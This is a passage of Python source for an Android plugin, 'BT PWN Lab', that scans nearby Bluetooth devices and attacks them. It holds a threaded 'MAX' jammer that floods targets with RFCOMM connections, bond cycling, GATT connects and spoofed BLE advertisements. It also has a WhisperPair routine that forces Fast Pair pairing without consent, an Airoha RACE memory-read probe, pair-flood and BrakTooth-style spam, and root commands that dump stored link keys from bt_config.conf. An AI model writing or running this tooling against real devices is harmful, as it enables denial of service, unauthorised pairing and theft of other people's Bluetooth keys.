def _vendor(mac):
    if not mac:
        return "?"
    return OUI.get(mac.replace(":", "").upper()[:6], "Unknown")


def _vulns_for(chip):
    return [v for v in VULNDB if "*" in v[5] or chip in v[5]]


def _chip_of(name, mac, uuids):
    n = (name or "").lower()
    m = (mac or "").replace(":", "").upper()
    us = [str(u).replace("-", "").lower() for u in (uuids or [])]
    best, score = None, 0
    for chip, sig in CHIP_HINTS.items():
        sc = 0
        for o in sig["oui"]:
            if m.startswith(o):
                sc += 3
        for k in sig["names"]:
            if k in n:
                sc += 2
        for u in sig["uuids"]:
            if any(u in x or x in u for x in us):
                sc += 5
        if sc > score:
            best, score = chip, sc
    return best or "unknown"


def _rssi_label(r):
    r = int(r)
    if r >= -55:
        return "Excellent"
    if r >= -70:
        return "Good"
    if r >= -85:
        return "Weak"
    return "Very weak"


def _fp_model(d):
    sd = d.get("serviceData") or d.get("service_data") or {}
    items = []
    if isinstance(sd, dict):
        items = list(sd.items())
    elif isinstance(sd, list):
        for e in sd:
            if isinstance(e, dict):
                items.append((e.get("uuid") or e.get("key"),
                              e.get("data") or e.get("value")))
            elif isinstance(e, (list, tuple)) and len(e) >= 2:
                items.append((e[0], e[1]))
    for u, v in items:
        us = str(u).replace("-", "").replace(":", "").lower()
        if "fe2c" in us:
            hx = str(v).replace(":", "").replace("-", "").replace(" ", "").upper()
            if len(hx) >= 6:
                return hx[:6]
    return None


# ---------------------------------------------------------------- v4.3: names
NAME_KEYS = ("name", "deviceName", "localName", "btName", "Name",
             "device_name", "local_name", "advertisedName")


def _pick_name(d):
    """Name from any key variant, including a nested scanRecord."""
    if not isinstance(d, dict):
        return None
    for k in NAME_KEYS:
        v = d.get(k)
        if isinstance(v, str) and v.strip():
            return v.strip()
    for sk in ("scanRecord", "scan_record", "record"):
        sr = d.get(sk)
        if isinstance(sr, dict):
            for k in ("deviceName", "localName", "name"):
                v = sr.get(k)
                if isinstance(v, str) and v.strip():
                    return v.strip()
    return None


def _hex_to_ascii(hx):
    try:
        raw = str(hx).replace(":", "").replace("-", "").replace(" ", "")
        b = bytes.fromhex(raw)
        s = b.decode("utf-8", "ignore").replace("\x00", "")
        return "".join(ch for ch in s if ch.isprintable()).strip()
    except Exception:
        return ""


def _dev_label(d):
    nm = _pick_name(d)
    if nm:
        return nm
    return "no name · %s" % (d.get("vendor") or "?")


# ============================================================================
#  EXECUTION: Dolphy bridge
# ============================================================================
_EXEC = None


def _fmt(res):
    if res is None:
        return ""
    s = res if isinstance(res, str) else str(res)
    t = s.strip()
    if t.startswith("{") and '"ok"' in t:
        try:
            d = json.loads(t)
            out = (d.get("out") or "") + (d.get("err") or "")
            if not out and not d.get("ok"):
                out = "exit=%s" % d.get("code")
            return out.strip()
        except Exception:
            pass
    return s


def _sh(cmd, root=True, timeout=12):
    if _EXEC is not None:
        try:
            return _EXEC(cmd, root)
        except Exception as e:
            return "ERR: %s" % e
    full = ("su -c '%s'" % cmd.replace("'", "'\\''")) if root else cmd
    try:
        p = subprocess.run(full, shell=True, capture_output=True, timeout=timeout)
        return (p.stdout or b"").decode("utf-8", "replace") + \
               (p.stderr or b"").decode("utf-8", "replace")
    except Exception as e:
        return "ERR: %s" % e


def _has_root():
    try:
        return "uid=0" in _sh("id")
    except Exception:
        return False


# ============================================================================
#  auto-discovery of BlueZ tools (incl. Magisk modules like Bluetooth++)
# ============================================================================
TOOL_NAMES = ["hcitool", "hciconfig", "btmgmt", "bluetoothctl",
              "hcidump", "btmon", "hciattach"]
_TOOLS = {}
_TOOLS_PROBED = False


def _probe_tools(force=False):
    global _TOOLS_PROBED
    if _TOOLS_PROBED and not force:
        return _TOOLS
    _TOOLS_PROBED = True
    _TOOLS.clear()
    for n in TOOL_NAMES:
        cmd = ("command -v %s 2>/dev/null "
               "|| ls /data/adb/modules/*/system/bin/%s 2>/dev/null | head -1 "
               "|| ls /data/adb/modules/*/system/xbin/%s 2>/dev/null | head -1 "
               "|| ls /data/local/tmp/%s 2>/dev/null | head -1 "
               "|| ls /system/xbin/%s 2>/dev/null | head -1" %
               (n, n, n, n, n))
        out = _sh(cmd, True).strip()
        first = out.splitlines()[0].strip() if out else ""
        if first and "No such" not in first and "not found" not in first:
            _TOOLS[n] = first
    return _TOOLS


def _tool(name):
    return _probe_tools().get(name) or name


def _have_bt_tools():
    t = _probe_tools()
    return bool(t.get("hcitool") or t.get("btmgmt") or t.get("bluetoothctl"))


# ============================================================================
#  PLUGIN
# ============================================================================
class BtPwnLab(BasePlugin):

    def __init__(self):
        super().__init__()
        self.scanning = False
        self.devices = {}
        self.selected = None
        self.filter = "all"
        self.status = "Ready"
        self.log_lines = []
        self.vuln_results = []
        self.jam_mode = "lescan"
        self.jam_proc = None
        self.jam_running = False
        self.keys_rows = []
        self._last_refresh = 0.0
        self._last_err = 0.0
        self.root_ok = False
        self.term_cmd = ""
        self.term_lines = []
        self.term_root = True
        self.max_running = False
        self.intensity = 8
        self.delay = 0.25
        self.target_mode = "selected"
        self.vec = {"rfcomm": True, "bond": True, "sdp": True, "inq": True,
                    "gatt": True, "name": False, "ble": False, "root": True,
                    "stack": False}
        self.stats = {}
        self.workers = []
        self._tick = None
        self.whisper_log = []
        self.race_log = []
        self.race_rows = []
        self.lab_log = []
        self.tools = {}
        # v4.3
        self.known_names = {}
        self.name_tried = set()
        self.name_log = []

    # ------------------------------------------------------------ lifecycle
    def on_plugin_load(self):
        global _EXEC
        _EXEC = self._exec
        try:
            self.root_ok = bool(self.api.getDevice().rootAvailable())
        except Exception:
            self.root_ok = _has_root()
        self.log("Loaded. root=%s" % self.root_ok)
        self.add_module(
            "BT PWN Lab",
            "BLE recon, jammer, link keys, BT audio vulnerabilities",
            "bluetooth_searching",
            "main",
            "BLUETOOTH",
            12,
        )
        threading.Thread(target=self._probe_tools_async, daemon=True).start()
        threading.Thread(target=self._refresh_known_names, daemon=True).start()
        try:
            self.hook_screen("bluetooth_whisperpair", "whisper_panel", "bottom", 60)
            self.hook_screen("other/bluetooth_whisperpair", "whisper_panel", "bottom", 60)
            self.hook_screen("other/bluetooth_jammer", "jam_fab", "fab", 60)
        except Exception as e:
            self.log("hook err: %s" % e)

    def _probe_tools_async(self):
        try:
            if not self.root_ok:
                return
            self.tools = _probe_tools(True)
            if self.tools:
                self.log("Tools: " + ", ".join(sorted(self.tools.keys())))
        except Exception as e:
            self.log("tools err: %s" % e)

    def on_plugin_unload(self):
        try:
            if self.scanning:
                self.api.bleStopScan(__id__)
        except Exception:
            pass
        self.max_running = False
        self.jam_stop()
        try:
            a = self.api.getAndroid()
            a.btStopDiscovery()
            a.bleAdvertiseStop()
        except Exception:
            pass

    # ------------------------------------------------------------- exec
    def _exec(self, cmd, root=True):
        raw = None
        if root and self.root_ok:
            try:
                raw = self.root(cmd)
            except Exception:
                raw = None
        if raw is None or (isinstance(raw, str) and not raw.strip()):
            try:
                raw = self.shell(cmd)
            except Exception as e:
                return "ERR: %s" % e
        return _fmt(raw)

    def log(self, msg):
        line = "%s  %s" % (time.strftime("%H:%M:%S"), msg)
        self.log_lines.append(line)
        if len(self.log_lines) > 400:
            self.log_lines = self.log_lines[-400:]

    def _err(self, msg):
        now = time.monotonic()
        if now - self._last_err >= 2.0:
            self._last_err = now
            self.log("scan err: %s" % msg)

    def llog(self, msg):
        line = "%s  %s" % (time.strftime("%H:%M:%S"), msg)
        self.lab_log.append(line)
        if len(self.lab_log) > 300:
            self.lab_log = self.lab_log[-300:]
        self.log("LAB: " + msg)

    # ---------------------------------------------------------------- v4.3
    def _refresh_known_names(self):
        """Names from bonded devices and bt_config.conf -- no connection needed."""
        m = {}
        try:
            data = json.loads(str(self.api.getAndroid().btBondedDevicesJson()))
            items = data.get("devices") if isinstance(data, dict) else data
            for e in (items or []):
                if isinstance(e, dict) and e.get("address"):
                    nm = _pick_name(e)
                    if nm:
                        m[str(e["address"]).upper()] = nm
        except Exception:
            pass
        for path in ("/data/misc/bluetooth/bt_config.conf",
                     "/data/misc/bluedroid/bt_config.conf"):
            try:
                raw = _sh("cat %s" % path)
                if "ERR" in raw or "No such" in raw:
                    continue
                cur = None
                for line in raw.splitlines():
                    s = line.strip()
                    if s.startswith("[") and s.endswith("]"):
                        cur = s[1:-1].upper()
                    elif cur and s.split("=")[0].strip() == "Name":
                        v = s.split("=", 1)[1].strip()
                        if v:
                            m[cur] = v
            except Exception:
                pass
        if m:
            self.known_names.update(m)
        self.log("Known names: %d" % len(self.known_names))
        # backfill already found devices
        for mac, d in list(self.devices.items()):
            if not _pick_name(d) and self.known_names.get(mac):
                d["name"] = self.known_names[mac]
        self.refresh()

    def _set_name(self, mac, name, src="gatt"):
        mac = str(mac).upper()
        if not name:
            return
        d = self.devices.get(mac)
        if d is None and self.selected and self.selected.get("address") == mac:
            d = self.selected
        if d is None:
            return
        if not _pick_name(d):
            d["name"] = name
            line = "%s  %s <- %s (%s)" % (time.strftime("%H:%M:%S"), mac, name, src)
            self.name_log.append(line)
            if len(self.name_log) > 100:
                self.name_log = self.name_log[-100:]
            self.log("Name: %s = %s (%s)" % (mac, name, src))
            self.refresh()

    def read_name(self):
        mac = (self.selected or {}).get("address")
        if not mac:
            return
        self.name_tried.add(mac)
        threading.Thread(target=self._read_name_worker, args=(mac,), daemon=True).start()

    def _read_name_worker(self, mac):
        dev = self.api.getAndroid()
        self.log("Reading name: %s" % mac)
        try:
            dev.gattConnect(mac, self.on_gatt_event)
            time.sleep(2.0)
            for ch in (DIS_NAME, DIS_MODEL, DIS_MANUF):
                try:
                    dev.gattRead(mac, DIS_SERVICE, ch)
                except Exception:
                    pass
                time.sleep(0.8)
            try:
                info = json.loads(str(dev.btDeviceInfoJson(mac)))
                nm = _pick_name(info) if isinstance(info, dict) else None
                if nm:
                    self._set_name(mac, nm, "android-cache")
            except Exception:
                pass
            time.sleep(0.5)
            dev.gattDisconnect(mac)
        except Exception as e:
            self.log("read_name err: %s" % e)
        if not _pick_name(self.devices.get(mac, {})):
            self.log("No name returned: %s (no DIS or device stays silent)" % mac)
        self.refresh()

    # ----------------------------------------------------------------- scan
    def toggle_scan(self):
        if self.scanning:
            try:
                self.api.bleStopScan(__id__)
            except Exception:
                pass
            self.scanning = False
            self.status = "Scan stopped · %d devices" % len(self.devices)
            self.log("Scan stopped")
        else:
            self.devices = {}
            threading.Thread(target=self._refresh_known_names, daemon=True).start()
            try:
                self.scanning = bool(self.api.bleStartScan(__id__, self.on_device, 300, 128))
            except Exception as e:
                self.scanning = False
                self.log("bleStartScan err: %s" % e)
            self.status = "Scan running…" if self.scanning else "Scan failed to start (check BT and permissions)"
            self.log(self.status)
        self.refresh()

    def on_device(self, payload):
        try:
            data = json.loads(str(payload))
        except Exception as e:
            self._err("json: %s" % e)
            return
        if isinstance(data, dict) and isinstance(data.get("devices"), list):
            items = data["devices"]
        elif isinstance(data, list):
            items = data
        else:
            items = [data]
        for d in items:
            if isinstance(d, dict):
                try:
                    self._add_device(d)
                except Exception as e:
                    self._err("dev: %s" % e)
        now = time.monotonic()
        if now - self._last_refresh >= 0.4:
            self._last_refresh = now
            self.refresh()

    def _add_device(self, d):
        mac = d.get("address") or d.get("mac") or d.get("Address")
        if not mac:
            return
        mac = str(mac).upper()
        prev = self.devices.get(mac)
        if prev:
            # v4.3: keep the name and useful fields on advertisement update
            if not _pick_name(d) and _pick_name(prev):
                d["name"] = _pick_name(prev)
            for k in ("fpModel", "chip", "vendor", "model", "manuf"):
                if not d.get(k) and prev.get(k):
                    d[k] = prev[k]
        nm = _pick_name(d) or self.known_names.get(mac)
        if nm:
            d["name"] = nm
        uuids = d.get("serviceUuids") or d.get("uuids") or []
        d["address"] = mac
        d["vendor"] = _vendor(mac)
        d["chip"] = _chip_of(d.get("name"), mac, uuids)
        d["race"] = any(str(u).replace("-", "").lower() in RACE_BLE_UUIDS
                        for u in uuids)
        d["fpModel"] = _fp_model(d)
        d["fp"] = bool(d["fpModel"]) or any(
            "fe2c" in str(u).replace("-", "").lower() for u in uuids)
        if d["fp"] and d["chip"] == "unknown":
            d["chip"] = "fastpair"
        d["vulns"] = _vulns_for(d["chip"])
        d["hasName"] = bool(_pick_name(d))
        d["last"] = time.time()
        self.devices[mac] = d

    def set_filter(self, value):
        self.filter = str(value)
        self.refresh()

    def visible(self):
        items = list(self.devices.values())
        if self.filter == "named":
            items = [d for d in items if _pick_name(d)]
        elif self.filter == "vuln":
            items = [d for d in items if d.get("vulns")]
        elif self.filter == "race":
            items = [d for d in items if d.get("race")]
        elif self.filter == "fp":
            items = [d for d in items if d.get("fp")]
        return sorted(items, key=lambda x: int(x.get("rssi", -127)), reverse=True)

    def open_device(self, d):
        self.selected = d
        self.navigate("details")
        # v4.3: automatic name lookup
        if (not _pick_name(d) and d.get("connectable")
                and d.get("address") not in self.name_tried):
            self.read_name()

    def cb_device(self, d):
        return lambda: self.open_device(d)

    # ---------------------------------------------------------------- vuln
    def assess_all(self):
        self.vuln_results = []
        for d in self.devices.values():
            for v in d.get("vulns", []):
                cve, fam, ver, cvss, name, chips, impact, probe = v
                if d.get("race") and probe == "race":
                    st = "RACE in the air"
                elif d.get("fp") and probe == "fp":
                    st = "Fast Pair in the air"
                elif d.get("chip") in chips:
                    st = "SUSPECTED"
                elif "*" in chips:
                    st = "protocol-level"
                else:
                    st = "info"
                self.vuln_results.append({
                    "mac": d.get("address"), "name": _dev_label(d),
                    "cve": cve, "fam": fam, "name2": name, "cvss": cvss,
                    "status": st, "impact": impact, "probe": probe,
                })
        self.vuln_results.sort(key=lambda x: -x["cvss"])
        self.log("Assessment: %d records" % len(self.vuln_results))
        self.refresh()

    # -------------------------------------------------------------- jammer
    JAM = {
        "lescan":   "hcitool -i hci0 lescan --duplicates",
        "inq":      "hcitool -i hci0 inq --length 8",
        "inq_fast": "hcitool -i hci0 inq --length 1",
        "feature":  "hcitool -i hci0 inq --length 4",
        "classic":  "hcitool -i hci0 inq",
        "iscan":    "hciconfig hci0 iscan",
        "pscan":    "hciconfig hci0 pscan",
        "reset":    "hciconfig hci0 reset",
    }

    def set_jam_mode(self, mode):
        self.jam_mode = str(mode)
        self.refresh()

    def _jam_cmd(self):
        c = self.JAM.get(self.jam_mode, self.JAM["lescan"])
        return c.replace("hcitool", _tool("hcitool")).replace("hciconfig", _tool("hciconfig"))

    def jam_start(self):
        if not self.root_ok:
            self.log("Jammer needs root")
            return
        if self.jam_running:
            return
        self.jam_running = True
        threading.Thread(target=self._jam_worker, args=(self._jam_cmd(),), daemon=True).start()
        self.log("JAM start: %s" % self.jam_mode)
        self.refresh()

    def _jam_worker(self, cmd):
        while self.jam_running:
            self._exec(cmd, True)

    def jam_stop(self):
        self.jam_running = False
        self._exec("pkill -f hcitool; pkill -f hciconfig; pkill -f btmgmt", True)
        self.log("JAM stop")

    def braktooth(self, kind):
        mac = (self.selected or {}).get("address")
        if not mac:
            return
        if not self.root_ok:
            self.log("BrakTooth: root required")
            return
        hci = _tool("hcitool")
        cmd = ("%s -i hci0 cc %s" % (hci, mac)) if kind == "conn" else \
              ("%s -i hci0 inq --length 8" % hci)
        self.jam_running = True
        threading.Thread(target=self._jam_worker, args=(cmd,), daemon=True).start()
        self.log("BrakTooth %s -> %s" % (kind, mac))
        self.refresh()

    def pair_flood(self):
        mac = (self.selected or {}).get("address")
        if not mac:
            return
        self.log("Pair flood -> %s" % mac)
        threading.Thread(target=self._pair_worker, args=(mac,), daemon=True).start()

    def _pair_worker(self, mac):
        for _ in range(12):
            _sh("%s -i hci0 dc %s" % (_tool("hcitool"), mac))
            time.sleep(0.4)
        self.log("Pair flood finished")

    # ------------------------------------------------------- JAMMER MAX
    SPP_UUIDS = [
        "00001101-0000-1000-8000-00805f9b34fb",
        "0000111e-0000-1000-8000-00805f9b34fb",
        "0000110b-0000-1000-8000-00805f9b34fb",
        "0000110a-0000-1000-8000-00805f9b34fb",
        "00001105-0000-1000-8000-00805f9b34fb",
        "00001124-0000-1000-8000-00805f9b34fb",
        "00001132-0000-1000-8000-00805f9b34fb",
        "0000112f-0000-1000-8000-00805f9b34fb",
        "00001115-0000-1000-8000-00805f9b34fb",
        "00001116-0000-1000-8000-00805f9b34fb",
        "00001103-0000-1000-8000-00805f9b34fb",
        "00001108-0000-1000-8000-00805f9b34fb",
    ]
    NAMES = ["PWN", "BT-PWN", "FreeBuds", "JBL GO", "AirPods", "WH-1000XM",
             "ESP32", "Galaxy Buds", "Soundcore", "Flipper", "Bose QC", "Beats"]

    def set_intensity(self, v):
        try:
            self.intensity = max(1, min(24, int(float(v))))
        except Exception:
            pass
        self.refresh()

    def set_delay(self, v):
        try:
            self.delay = max(0.02, min(2.0, float(v)))
        except Exception:
            pass
        self.refresh()

    def set_target_mode(self, v):
        self.target_mode = str(v)
        self.refresh()

    def toggle_vec(self, key):
        self.vec[key] = not self.vec.get(key, False)
        self.refresh()

    def _pick_mac(self, k):
        t = self._targets()
        return t[k % len(t)]

    def _targets(self):
        if self.target_mode == "selected" and self.selected:
            return [self.selected.get("address")]
        macs = [d.get("address") for d in self.visible() if d.get("address")]
        if not macs and self.selected:
            macs = [self.selected.get("address")]
        return macs[:16] or ["00:00:00:00:00:00"]

    def _bump(self, k, n=1):
        self.stats[k] = self.stats.get(k, 0) + n

    def stat_line(self):
        s = self.stats
        if not s:
            return "STATUS idle"
        return ("STATUS rfcm=%d conn=%d pkt=%d | bond=%d sdp=%d inq=%d "
                "gatt=%d/%d ble=%d root=%d stk=%d err=%d") % (
            s.get("rfcm", 0), s.get("conn", 0), s.get("pkt", 0), s.get("bond", 0),
            s.get("sdp", 0), s.get("inq", 0), s.get("gatt", 0), s.get("gatt_ok", 0),
            s.get("ble", 0), s.get("root", 0), s.get("stk", 0), s.get("err", 0))

    def vec_summary(self):
        on = [k for k, v in self.vec.items() if v]
        return "vectors: " + " · ".join(on)

    def jam_max_start(self):
        if self.max_running:
            return
        if not self.devices and not self.selected:
            self.log("MAX: scan the air first")
            return
        self.max_running = True
        self.stats = dict.fromkeys(
            ["rfcm", "conn", "pkt", "bond", "sdp", "inq", "gatt", "gatt_ok",
             "ble", "root", "stk", "err"], 0)
        self.workers = []
        for i in range(self.intensity):
            t = threading.Thread(target=self._w_rfcomm, args=(i,), daemon=True)
            t.start()
            self.workers.append(t)
        for fn in (self._w_bond, self._w_inq, self._w_gatt, self._w_pkt,
                   self._w_name, self._w_ble, self._w_root, self._w_stack):
            t = threading.Thread(target=fn, args=(0,), daemon=True)
            t.start()
            self.workers.append(t)
        if self._tick is None or not self._tick.is_alive():
            self._tick = threading.Thread(target=self._stat_tick, daemon=True)
            self._tick.start()
        self.log("MAX JAM start · rfcomm x%d · targets %d · %s"
                 % (self.intensity, len(self._targets()), self.vec_summary()))
        self.refresh()

    def jam_max_stop(self):
        self.max_running = False
        self.log("MAX JAM stop")
        self.refresh()

    def _stat_tick(self):
        while self.max_running:
            self.refresh()
            time.sleep(1.0)

    # ---- workers
    def _w_rfcomm(self, i):
        dev = self.api.getAndroid()
        k = i
        while self.max_running:
            if not self.vec["rfcomm"]:
                time.sleep(0.1)
                continue
            mac = self._pick_mac(k)
            uuid = self.SPP_UUIDS[k % len(self.SPP_UUIDS)]
            try:
                dev.btConnectRfcomm(mac, uuid, self.on_rfcomm_event)
                self._bump("rfcm")
                self._bump("sdp")
                if k % 3 == 0:
                    dev.btDisconnectRfcomm(mac)
            except Exception:
                self._bump("err")
            k += 1
            time.sleep(self.delay)

    def _w_pkt(self, _):
        dev = self.api.getAndroid()
        while self.max_running:
            if not self.vec["sdp"]:
                time.sleep(0.1)
                continue
            for mac in self._targets()[:4]:
                try:
                    if dev.btSendRfcommText(mac, "PWN%d" % random.randint(0, 9999)):
                        self._bump("pkt")
                except Exception:
                    self._bump("err")
            time.sleep(self.delay)

    def _w_bond(self, _):
        dev = self.api.getAndroid()
        flip = 0
        while self.max_running:
            if not self.vec["bond"]:
                time.sleep(0.1)
                continue
            mac = self._pick_mac(flip)
            try:
                if flip % 2 == 0:
                    dev.btRemoveBond(mac)
                else:
                    dev.btCreateBond(mac)
                self._bump("bond")
            except Exception:
                self._bump("err")
            flip += 1
            time.sleep(max(0.4, self.delay * 2))

    def _w_inq(self, _):
        dev = self.api.getAndroid()
        while self.max_running:
            if not self.vec["inq"]:
                time.sleep(0.1)
                continue
            try:
                dev.btStartDiscovery(self.on_bt_device)
                self._bump("inq")
                time.sleep(2.5)
                dev.btStopDiscovery()
            except Exception:
                self._bump("err")
            time.sleep(self.delay)

    def _w_gatt(self, _):
        dev = self.api.getAndroid()
        k = 0
        while self.max_running:
            if not self.vec["gatt"]:
                time.sleep(0.1)
                continue
            mac = self._pick_mac(k)
            try:
                dev.gattConnect(mac, self.on_gatt_event)
                self._bump("gatt")
                time.sleep(self.delay)
                dev.gattDiscoverServices(mac)
                time.sleep(self.delay)
                dev.gattDisconnect(mac)
            except Exception:
                self._bump("err")
            k += 1
            time.sleep(self.delay)

    def _w_name(self, _):
        dev = self.api.getAndroid()
        k = 0
        while self.max_running:
            if not self.vec["name"]:
                time.sleep(0.1)
                continue
            try:
                dev.btSetName(self.NAMES[k % len(self.NAMES)])
            except Exception:
                self._bump("err")
            k += 1
            time.sleep(1.0)

    def _w_ble(self, _):
        dev = self.api.getAndroid()
        while self.max_running:
            if not self.vec["ble"]:
                time.sleep(0.1)
                continue
            try:
                payload = "".join(random.choice("0123456789ABCDEF") for _ in range(24))
                dev.bleAdvertiseCustom(0x004C, payload, None, None, None,
                                       False, False, False)
                self._bump("ble")
            except Exception:
                self._bump("err")
            time.sleep(max(0.2, self.delay))

    def _w_root(self, _):
        if not (self.root_ok and self.vec["root"]):
            return
        if not _have_bt_tools():
            self.log("no hcitool/btmgmt/bluetoothctl -- root vector skipped")
            return
        hci = _probe_tools().get("hcitool")
        mgmt = _probe_tools().get("btmgmt")
        k = 0
        while self.max_running:
            try:
                if hci:
                    if k % 3 == 0:
                        self._exec("%s -i hci0 inq --length 8" % hci, True)
                    elif k % 3 == 1:
                        self._exec("timeout 3 %s -i hci0 lescan --duplicates" % hci, True)
                    else:
                        for mac in self._targets()[:4]:
                            self._exec("%s -i hci0 cc %s" % (hci, mac), True)
                elif mgmt:
                    if k % 2 == 0:
                        self._exec("timeout 6 %s find -l" % mgmt, True)
                    else:
                        for mac in self._targets()[:2]:
                            self._exec("%s con %s" % (mgmt, mac), True)
                self._bump("root")
            except Exception:
                self._bump("err")
            k += 1
            time.sleep(max(0.5, self.delay * 3))

    def _w_stack(self, _):
        if not self.root_ok:
            return
        k = 0
        while self.max_running:
            if not self.vec["stack"]:
                time.sleep(0.2)
                continue
            try:
                self._exec("cmd bluetooth_manager disable", True)
                time.sleep(1.6)
                self._exec("cmd bluetooth_manager enable", True)
                time.sleep(1.6)
                if k % 3 == 2:
                    self._exec("am force-stop com.android.bluetooth", True)
                self._bump("stk")
            except Exception:
                self._bump("err")
            k += 1
            time.sleep(max(0.5, self.delay * 4))

    # ---- events
    def on_rfcomm_event(self, payload):
        try:
            e = json.loads(str(payload))
        except Exception:
            return
        if str(e.get("event", "")).lower().startswith("connect"):
            self._bump("conn")
        self.log("RFCOMM %s %s" % (e.get("address"), e.get("event")))

    def on_gatt_event(self, payload):
        try:
            e = json.loads(str(payload))
        except Exception:
            return
        ev = str(e.get("event", "")).lower()
        if "connect" in ev and "disconnect" not in ev:
            self._bump("gatt_ok")
        # v4.3: extract the name/model from DIS reads
        mac = str(e.get("address") or "").upper()
        cu = str(e.get("charUuid") or e.get("characteristic") or e.get("uuid") or "")
        cu = cu.lower().replace("-", "")
        val = e.get("value") or e.get("data") or e.get("hex")
        if val and cu:
            txt = _hex_to_ascii(val)
            if txt and len(txt) > 1:
                if "2a00" in cu:
                    self._set_name(mac, txt, "gatt")
                elif "2a24" in cu:
                    d = self.devices.get(mac)
                    if d:
                        d["model"] = txt
                elif "2a29" in cu:
                    d = self.devices.get(mac)
                    if d:
                        d["manuf"] = txt
        self.log("GATT %s %s" % (e.get("address"), e.get("event")))

    def on_bt_device(self, payload):
        try:
            d = json.loads(str(payload))
        except Exception:
            return
        mac = str(d.get("address") or "").upper()
        nm = _pick_name(d)
        if mac and nm:
            self._set_name(mac, nm, "classic")
        self.log("DISC %s %s" % (mac, nm or ""))

    # ------------------------------------------- WHISPERPAIR (CVE-2025-36911)
    def whisper_attack(self):
        mac = (self.selected or {}).get("address")
        if not mac:
            return
        self.whisper_log = []
        threading.Thread(target=self._whisper_worker, args=(mac,), daemon=True).start()

    def _whisper_worker(self, mac):
        dev = self.api.getAndroid()

        def w(s):
            self.whisper_log.append("%s  %s" % (time.strftime("%H:%M:%S"), s))
            self.log("WHISPER: " + s)

        w("seeker -> provider %s" % mac)
        w("check: Fast Pair must not be in pairing mode")
        try:
            w("GATT connect")
            dev.gattConnect(mac, self.on_gatt_event)
            time.sleep(1.5)
            salt = "%04X" % random.randint(0, 0xFFFF)
            req = "00" + "01" + mac.replace(":", "").upper() + salt
            w("KBP request 0xFE2C1234 = %s" % req)
            dev.gattWrite(mac, FP_SERVICE, FP_KBP, req)
            time.sleep(1.0)
            w("classic bond (pairing mode bypass)")
            dev.btCreateBond(mac)
            time.sleep(2.5)
            key = "".join(random.choice("0123456789ABCDEF") for _ in range(32))
            w("account key 0xFE2C1236 = %s" % key)
            dev.gattWrite(mac, FP_SERVICE, FP_ACCOUNT, "01" + key)
            w("result: device paired without consent (WhisperPair)")
        except Exception as e:
            w("ERR: %s" % e)
        self.refresh()

    def whisper_bond_spam(self):
        mac = (self.selected or {}).get("address")
        if not mac:
            return
        self.log("WHISPER: bond spam -> %s" % mac)
        threading.Thread(target=self._whisper_bond_worker, args=(mac,), daemon=True).start()

    def _whisper_bond_worker(self, mac):
        dev = self.api.getAndroid()
        for _ in range(10):
            try:
                dev.btRemoveBond(mac)
                time.sleep(0.5)
                dev.btCreateBond(mac)
            except Exception:
                pass
            time.sleep(1.0)
        self.log("WHISPER: bond spam finished")

    def open_dolphy_whisper(self):
        self.navigate_app("other/bluetooth_whisperpair")

    def open_dolphy_jammer(self):
        self.navigate_app("other/bluetooth_jammer")

    # ------------------------------------------------- RACE probe (Airoha)
    RACE_RFCOMM = ["00000000-0000-0000-0099-aabbccddeeff",
                   "8901dfa8-5c7e-4d8f-9f0c-c2b70683f5f0",
                   "2d064aa9-32b5-4970-865c-643742bd2862"]
    RACE_CMDS = [("build 0x1E08", "1E08"),
                 ("bdaddr 0x0CD5", "0CD5"),
                 ("ram rd 0x1680", "1680")]

    def race_probe(self):
        mac = (self.selected or {}).get("address")
        if not mac:
            return
        self.race_log = []
        threading.Thread(target=self._race_worker, args=(mac,), daemon=True).start()

    def _race_worker(self, mac):
        dev = self.api.getAndroid()
        self.race_rows = []
        for u in self.RACE_RFCOMM:
            self._rline("RFCOMM connect ch21 uuid=%s" % u[:8])
            try:
                dev.btConnectRfcomm(mac, u, self.on_race_event)
            except Exception as e:
                self._rline("ERR %s" % e)
            time.sleep(1.2)
        for label, cmd in self.RACE_CMDS:
            self._rline("RACE %s -> %s" % (label, cmd))
            try:
                dev.btSendRfcomm(mac, cmd)
            except Exception as e:
                self._rline("ERR %s" % e)
            time.sleep(0.6)
        self._rline("RACE: replies present = Airoha open without auth (CVE-2025-20700..20702)")
        self.refresh()

    def _rline(self, s):
        line = "%s  %s" % (time.strftime("%H:%M:%S"), s)
        self.race_log.append(line)
        self.log("RACE: " + s)

    def on_race_event(self, payload):
        self._rline(str(payload)[:180])
        self.refresh()

    # ---------------------------------------------------------------- keys
    def load_keys(self):
        raw = ""
        for path in ("/data/misc/bluetooth/bt_config.conf",
                     "/data/misc/bluedroid/bt_config.conf"):
            raw = _sh("cat %s" % path)
            if "ERR" not in raw and "No such" not in raw:
                break
        rows, cur = [], None
        for line in raw.splitlines():
            s = line.strip()
            if s.startswith("[") and s.endswith("]"):
                if cur:
                    rows.append(cur)
                cur = {"mac": s[1:-1].upper()}
            elif "=" in s and cur is not None:
                k, v = s.split("=", 1)
                cur[k.strip()] = v.strip()
        if cur:
            rows.append(cur)
        self.keys_rows = [{
            "mac": r.get("mac", ""),
            "name": r.get("Name") or "(no name)",
            "key": r.get("LinkKey") or "-",
            "type": r.get("LinkKeyType") or "-",
            "vendor": _vendor(r.get("mac", "")),
        } for r in rows if len(r.get("mac", "").split(":")) == 6]
        self.log("Link keys: %d" % len(self.keys_rows))
        self.refresh()

    # ---------------------------------------------------------- terminal
    QUICK = [
        ("id", "id"),
        ("bt state", "cmd bluetooth_manager get-state || dumpsys bluetooth_manager | head -20"),
        ("bt on", "cmd bluetooth_manager enable"),
        ("bt off", "cmd bluetooth_manager disable"),
        ("stack kill", "am force-stop com.android.bluetooth; killall com.android.bluetooth"),
        ("snoop on", "settings put secure bluetooth_hci_log 1; "
                     "setprop persist.bluetooth.btsnooplogmode full"),
        ("snoop off", "settings put secure bluetooth_hci_log 0"),
        ("snoop ls", "ls -l /data/misc/bluetooth/logs/"),
        ("btmac", "cat /persist/bdaddr.txt 2>/dev/null; getprop ro.boot.btmacaddr"),
        ("props bt", "resetprop -p 2>/dev/null | grep -i -E 'blue|bt_|btsnoop'"),
        ("logcat bt", "logcat -d -s bt_btif bt_stack BluetoothManagerService | tail -60"),
        ("dumpsys bt", "dumpsys bluetooth_manager | head -100"),
        ("tools", "command -v hcitool hciconfig btmgmt bluetoothctl"),
        ("selinux", "getenforce"),
        ("modules", "ls /data/adb/modules/"),
    ]

    def term_set(self, v):
        self.term_cmd = str(v)

    def term_clear(self):
        self.term_lines = []
        self.refresh()

    def term_mode(self, v):
        self.term_root = (str(v) == "root")
        self.refresh()

    def term_run(self):
        cmd = (self.term_cmd or "").strip()
        if not cmd:
            return
        use_root = self.term_root
